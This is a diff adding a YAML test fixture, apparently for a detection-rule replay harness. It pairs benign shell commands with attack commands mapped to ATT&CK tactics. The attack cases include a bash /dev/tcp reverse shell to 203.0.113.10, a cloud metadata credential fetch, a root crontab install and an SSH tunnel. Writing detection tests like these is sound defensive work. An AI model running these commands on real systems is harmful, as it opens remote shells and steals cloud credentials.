@@ -1,0 +1,180 @@
+# Audit follow-up probes: benign operations that must stay clean after the
+# rule fixes, plus new attack forms the fixes must now catch. Driven through
+# the same r5check replay harness (wrapper + direct events per case).
+false_positives:
+  - id: BP01
+    tactic: TA0002
+    technique: T0000
+    name: curl pipe to sha256sum checksum verify
+    cmd: 'curl -s https://dl.example.com/file.tar.gz | sha256sum'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP02
+    tactic: TA0002
+    technique: T0000
+    name: wget pipe shasum verify
+    cmd: 'wget -q -O - http://203.0.113.10/file | shasum -c -'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP03
+    tactic: TA0010
+    technique: T0000
+    name: scp backup archive to vault
+    cmd: 'scp /data/backup.tar.gz ops@vault:/backup/'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP04
+    tactic: TA0010
+    technique: T0000
+    name: rsync archive to nas
+    cmd: 'rsync -az /srv/site-20261113.tar.gz backup@nas:/pool/'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP05
+    tactic: TA0009
+    technique: T0000
+    name: nightly pg_dump backup
+    cmd: 'pg_dump -U postgres appdb > /backup/appdb-20261113.sql'
+    creates_process: false
+    expected_rules: exec-dump-database
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP06
+    tactic: TA0002
+    technique: T0000
+    name: curl ES bulk load
+    cmd: 'curl -s -XPOST localhost:9200/_bulk --data-binary @bulk.json'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP07
+    tactic: TA0002
+    technique: T0000
+    name: curl API smoke test with file body
+    cmd: 'curl -X POST -d @request.json http://127.0.0.1:8080/api/v1/users'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP08
+    tactic: TA0043
+    technique: T0000
+    name: routine host -t A lookup
+    cmd: 'host -t A www.example.com'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP09
+    tactic: TA0003
+    technique: T0000
+    name: grep useradd in secure log
+    cmd: 'grep useradd /var/log/secure'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP10
+    tactic: TA0011
+    technique: T0000
+    name: benign /dev/tcp port probe
+    cmd: "timeout 1 bash -c 'echo > /dev/tcp/10.0.0.1/80'"
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP11
+    tactic: TA0003
+    technique: T0000
+    name: crontab list and local file install
+    cmd: 'crontab -l && crontab mycron.txt'
+    creates_process: false
+    expected_rules: []
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP12
+    tactic: TA0006
+    technique: T0000
+    name: public key distribution
+    cmd: 'scp id_rsa.pub deploy@server:~/.ssh/authorized_keys'
+    creates_process: false
+    expected_rules: exec-cred-material-read
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+  - id: BP13
+    tactic: TA0006
+    technique: T0000
+    name: cat own passwd for uid lookup
+    cmd: 'cat /etc/passwd | grep -c root'
+    creates_process: false
+    expected_rules: exec-system-discovery
+    intent_tags: []
+    expect: silent
+    severity_hint: ''
+attacks:
+  - id: BA01
+    tactic: TA0008
+    technique: T1572
+    name: ssh flag-first local forward
+    cmd: 'ssh -L 5432:localhost:5432 dev@bastion'
+    creates_process: false
+    expected_rules:
+      - exec-lateral-ssh-forward
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+  - id: BA02
+    tactic: TA0003
+    technique: T1053.003
+    name: crontab install as root user
+    cmd: 'crontab -u root /tmp/.bench-evil-cron'
+    creates_process: false
+    expected_rules:
+      - exec-persistence-cron-write
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
+  - id: BA03
+    tactic: TA0006
+    technique: T1552.005
+    name: cloud metadata credential fetch
+    cmd: 'curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/'
+    creates_process: false
+    expected_rules:
+      - exec-cred-metadata-creds
+      - exec-cred-metadata-fetch
+    intent_tags: []
+    expect: detectable
+    severity_hint: critical
+  - id: BA04
+    tactic: TA0011
+    technique: T1059.004
+    name: dev tcp reverse shell fd dup
+    cmd: 'bash -i >& /dev/tcp/203.0.113.10/9444 0>&1'
+    creates_process: false
+    expected_rules:
+      - exec-dev-tcp-connect
+    intent_tags: []
+    expect: detectable
+    severity_hint: high
